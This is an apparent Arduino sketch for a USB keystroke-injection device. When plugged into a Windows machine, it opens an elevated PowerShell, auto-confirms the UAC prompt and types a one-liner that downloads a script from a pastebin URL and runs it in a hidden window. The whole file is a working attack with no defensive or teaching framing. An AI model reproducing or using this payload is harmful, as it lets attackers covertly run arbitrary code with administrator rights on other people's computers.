#include <esKeyboard.h>

#define defaultDelay 5

String scripturl = "https://pastebin.com/raw/VpJCR4xy";

void typeKey(int key){
  Keyboard.press(key);
  delay(defaultDelay);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell Start-Process powershell -Verb runAs");
  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('s');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("cd $env:TEMP; (New-Object System.Net.WebClient).DownloadString(\"");
  Keyboard.print(scripturl);
  Keyboard.print("\") | powershell -WindowStyle Hidden");
  
  typeKey(KEY_RETURN);
  
  /* ----- End-Script -----*/
  
  Keyboard.end();
}

void loop(){ /* ----- Unused-Loop -----*/ }
